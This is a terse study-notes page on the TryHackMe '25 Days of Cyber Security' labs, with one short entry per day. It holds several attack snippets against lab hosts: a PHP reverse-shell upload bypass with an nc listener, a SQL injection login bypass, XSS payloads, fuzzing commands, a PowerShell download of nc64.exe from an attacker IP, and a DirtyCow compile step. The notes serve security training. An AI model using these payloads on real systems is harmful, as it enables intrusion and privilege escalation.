---
title: (N)(THM)25 Days of Cyber Security
published: true
---

### [Day 1] Web Exploitation A Christmas Crisis

Web/HTTP(S)/Cookies

Cookies encodede -> cyberchef

### [Day 2] Web Exploitation The Elf Strikes Back!

File upload bypass filter
php rev shell => only pic allowed -> file.jpg.php

file | accepted file format | execuable
root nc -lvnp port

### [Day 3] Web Exploitation Christmas Chaos

burpsuite credentials testing

one thing -> sniper
more -> cluster bomb

### [Day 4] Web Exploitation Santa's watching

fuzzing with wfuzz or gobuster

`sudo wfuzz -c -z file,/home/kali/Documents/thm/25_days_of_cyber_security/day4/wordlist.txt -u http://10.10.182.221/api/site-log.php?date=FUZZ `

`wfuzz -c -z file,big.txt -d "breed=FUZZ" -u http://shibes.xyz/api.php`

### [Day 5] Web Exploitation Someone stole Santa's gift list!

SQL injection
user : asdf'
pwd or 1=1 --

### [Day 6] Web Exploitation Be careful with what you wish on a Christmas night

OWASP ZAP automate XSS scan

```
<img src='LINK' onmouseover="alert('xss')">
```

```
> <script> evilcode() </script>
```

`10.10.100.27/reflected?keyword=<script>alert(1)</script>`

### [Day 7] Networking The Grinch Really Did Steal Christmas

wireshark

`filter http.request.method==GET`

### [Day 8] Networking What's Under the Christmas Tree?

nmap

### [Day 9] Networking Anyone can be Santa!

ftp anonymous login allowed -> able to found \*.sh file that we get and put we able to add reverse shell

### [Day 10] Networking Don't be sElfish!

Samba discover enum4linux -> know username and shares try login with ->
possible weak password

### [Day 11] - The Rogue Gnome: Prelude

```shell
python3 -m http.server 8080
```

[GTFObins](https://gtfobins.github.io/)

### [Day 12] Networking Ready, set, elf.

Windows PrivEsc:

```powershell
Invoke-WebRequest "http://10.9.158.252:9999/nc64.exe" -OutFile "nc64.exe"
```

- powershell
- WinPeas
- powerup.ps1

### [Day 13] Networking Coal for Christmas

DirtyCow

```shell
gcc -pthread dirty.c -o dirty -lcrypt
```

### [Day 14] OSINT Where's Rudolph?

OSINT

### [Day 15] Scripting There's a Python in my stocking!

python scripting

### [Day 16] Scripting Help! Where is Santa?

python api endpoint fuzzing

### [Day 17] Reverse Engineering ReverseELFneering

[radare2](https://github.com/radareorg/radare2)

### [Day 18] Reverse Engineering The Bits of Christmas

ILSpy

### [Day 19] Special by Tib3rius The Naughty or Nice List

Server-Side Request Forgery

### [Day 20] Blue Teaming PowershELlF to the rescue

powershell

### [Day 21] Blue Teaming Time for some ELForensics

powershell

### [Day 22] Blue Teaming Elf McEager becomes CyberElf

cyberchef

### [Day 23] Blue Teaming The Grinch strikes again!

windows

### [Day 24] Special by DarkStar The Trial Before Christmas
